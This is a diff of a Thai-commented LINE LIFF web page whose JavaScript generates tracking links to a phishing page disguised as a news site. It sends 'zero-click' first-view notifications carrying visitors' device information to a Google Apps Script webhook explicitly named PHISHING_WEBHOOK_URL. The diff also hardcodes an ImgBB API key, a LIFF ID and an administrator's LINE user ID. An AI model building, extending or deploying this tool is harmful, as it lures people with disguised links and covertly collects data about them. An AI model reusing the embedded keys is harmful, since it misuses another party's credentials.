@@ -375,13 +375,14 @@
         let isLiffInitialized = false;
         let userHasPermission = false;
         
-        // ค่า Config
-        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwfF5RE-QJtiKXLCA_MQFEGiLMTYD4vPm1MyNggaNp7v2gaGUVvy_pd9KGGzYIzirRcKw/exec';
+        // ค่า Config สำคัญ
+        const LIFF_ID = '2006984626-AlBKqrn5'; // ใส่ LIFF ID ของคุณตรงนี้
+        const IMGBB_API_KEY = '0854e4f08da46fb35f126bdf17984657'; // ใส่ API key ของ ImgBB
+        
+        // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
+        const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx4R2Mnns-NyYymfbL4VV0PCkpnohKzQrxsnWqffi5fubNExZGjx-ZJ1rousvyxhRnhMA/exec'; // ไฟล์ LineOA.html
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw8Ulw20ANY1UBSX5_lXoZj2RhORy6mOH3QUuGwXJIWp4tkYj3o2bzZwdkF5JxwHf3XKA/exec'; // ไฟล์ GoogleScript.html
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
-        // ใส่ LIFF ID ของคุณตรงนี้
-        const LIFF_ID = '2006984626-AlBKqrn5';
-        // ใส่ API Key ของ ImgBB หรือบริการ Image Hosting อื่นๆ
-        const IMGBB_API_KEY = '0854e4f08da46fb35f126bdf17984657';
         
         // เริ่มต้นการทำงาน LIFF
         document.addEventListener('DOMContentLoaded', function() {
@@ -451,45 +452,50 @@
             }
         }
         
-        // ฟังก์ชันตรวจสอบสิทธิ์ผู้ใช้
+        // ฟังก์ชันตรวจสอบสิทธิ์ผู้ใช้ (เรียกใช้ LineOA.html)
         async function checkUserPermission(userId) {
             try {
-                const response = await fetch(WEBHOOK_URL, {
+                console.log("กำลังตรวจสอบสิทธิ์ผู้ใช้:", userId);
+                
+                const response = await fetch(LINE_OA_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
                         action: 'checkUserPermission',
-                        userId: userId,
-                        requestId: generateUniqueId()
-                    }),
-                    mode: 'no-cors'
+                        userId: userId
+                    })
                 });
                 
                 try {
-                    const data = await response.json();
-                    return data.hasPermission === true;
+                    // ตรวจสอบว่า response เป็น JSON หรือไม่
+                    const contentType = response.headers.get("content-type");
+                    if (contentType && contentType.includes("application/json")) {
+                        const data = await response.json();
+                        console.log("ผลการตรวจสอบสิทธิ์:", data);
+                        return data.hasPermission === true;
+                    } else {
+                        console.log("Server ไม่ได้ตอบกลับเป็น JSON, ใช้การตรวจสอบสำรอง");
+                        return checkUserPermissionFallback(userId);
+                    }
                 } catch (e) {
-                    // หากไม่สามารถแปลง response เป็น JSON ได้
-                    // ให้ตรวจสอบจาก Sheet ด้วยตัวเอง
-                    console.log("ไม่สามารถอ่านข้อมูลจาก Webhook, กำลังตรวจสอบสิทธิ์แบบ Fallback");
+                    console.error("ไม่สามารถแปลง response เป็น JSON:", e);
                     return checkUserPermissionFallback(userId);
                 }
             } catch (error) {
                 console.error('Error checking permission:', error);
-                // หากเกิดข้อผิดพลาดในการเชื่อมต่อ ให้ตรวจสอบจาก Sheet ด้วยตัวเอง
+                // หากเกิดข้อผิดพลาดในการเชื่อมต่อ ให้ตรวจสอบจาก ID โดยตรง
                 return checkUserPermissionFallback(userId);
             }
         }
         
-        // ฟังก์ชันตรวจสอบสิทธิ์แบบ Fallback (จำลองการทำงานเหมือนใน GoogleScript.html)
+        // ฟังก์ชันตรวจสอบสิทธิ์แบบ Fallback (ใช้เมื่อไม่สามารถเชื่อมต่อกับ server ได้)
         function checkUserPermissionFallback(userId) {
-            // ในกรณีที่ไม่สามารถเชื่อมต่อกับ Webhook ได้
-            // คุณสามารถระบุรายการ userId ที่มีสิทธิ์ไว้ตรงนี้
+            // กำหนด userId ที่มีสิทธิ์ใช้งานล่วงหน้า (ควรเป็น admin เท่านั้น)
             const approvedUserIds = [
-                'U69aa2cb90c9f40291278c346c50dc021', // คืนค่า userId ของผู้ดูแลระบบ
-                // สามารถเพิ่ม userId อื่นๆ ที่อนุมัติแล้วได้ที่นี่
+                'U69aa2cb90c9f40291278c346c50dc021' // ไอดีผู้ดูแลระบบจากไฟล์ LineOA.html
+                // สามารถเพิ่ม userId อื่นๆ ที่อนุมัติแล้วได้
             ];
             
             return approvedUserIds.includes(userId);
@@ -621,6 +627,12 @@
                 return;
             }
             
+            // ตรวจสอบขนาดรูปภาพ (จำกัดขนาดไฟล์ไม่เกิน 10MB)
+            if (file.size > 10 * 1024 * 1024) {
+                showStatus('รูปภาพมีขนาดใหญ่เกินไป (ไม่เกิน 10MB)', false);
+                return;
+            }
+            
             selectedImage = file;
             
             // แสดงตัวอย่างรูปภาพ
@@ -637,7 +649,7 @@
             checkCanShare();
         }
         
-        // ฟังก์ชันอัพโหลดรูปภาพไปยัง Imgur หรือบริการอื่นๆ
+        // ฟังก์ชันอัพโหลดรูปภาพไปยัง ImgBB
         async function uploadImage() {
             if (!selectedImage) {
                 showStatus('กรุณาเลือกรูปภาพก่อน', false);
@@ -648,8 +660,7 @@
             document.querySelector('.loader').style.display = 'block';
             
             try {
-                // ใช้ ImgBB API สำหรับอัพโหลดรูปภาพ (ฟรี)
-                // คุณต้องสมัครและรับ API key จาก https://api.imgbb.com/
+                // ใช้ ImgBB API สำหรับอัพโหลดรูปภาพ
                 const formData = new FormData();
                 formData.append('image', selectedImage);
                 formData.append('key', IMGBB_API_KEY);
@@ -661,9 +672,10 @@
                 
                 const data = await response.json();
                 
+                // ซ่อน loader
+                document.querySelector('.loader').style.display = 'none';
+                
                 if (data.success) {
-                    // ซ่อน loader
-                    document.querySelector('.loader').style.display = 'none';
                     return data.data.url;
                 } else {
                     throw new Error(data.error.message || 'การอัพโหลดล้มเหลว');
@@ -701,7 +713,7 @@
             
             trackingKey = timestamp + '-' + randomPart;
             
-            // บันทึก Tracking Key และ Case Name
+            // บันทึก Tracking Key และ Case Name (ใช้ GoogleScript.html)
             saveTrackingCaseMapping(trackingKey, caseName);
             
             showStatus(`Tracking Key สร้างสำเร็จ: ${trackingKey}`, true);
@@ -710,7 +722,7 @@
             checkCanShare();
         }
         
-        // ฟังก์ชันบันทึก Tracking Key และ Case Name
+        // ฟังก์ชันบันทึก Tracking Key และ Case Name (ส่งไปที่ GoogleScript.html)
         async function saveTrackingCaseMapping(trackKey, caseName) {
             if (!isLiffInitialized || !userId) {
                 showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
@@ -718,8 +730,8 @@
             }
             
             try {
-                // ส่งข้อมูลไปยัง Google Script Webhook
-                const response = await fetch(WEBHOOK_URL, {
+                // ส่งข้อมูลไปยัง Google Script Webhook (GoogleScript.html)
+                const response = await fetch(PHISHING_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -868,7 +880,7 @@
             }
         }
         
-        // ฟังก์ชันส่งการแจ้งเตือน Zero Click
+        // ฟังก์ชันส่งการแจ้งเตือน Zero Click (ส่งไปที่ GoogleScript.html)
         async function sendZeroClickNotification(trackingKey, caseName) {
             try {
                 // ข้อมูลอุปกรณ์และข้อมูลพื้นฐานเพื่อส่งไปยังเซิร์ฟเวอร์
@@ -887,8 +899,8 @@
                     type: "zero-click-first-view"
                 };
                 
-                // ส่งข้อมูลไปยัง Webhook
-                await fetch(WEBHOOK_URL, {
+                // ส่งข้อมูลไปยัง Webhook (GoogleScript.html)
+                await fetch(PHISHING_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
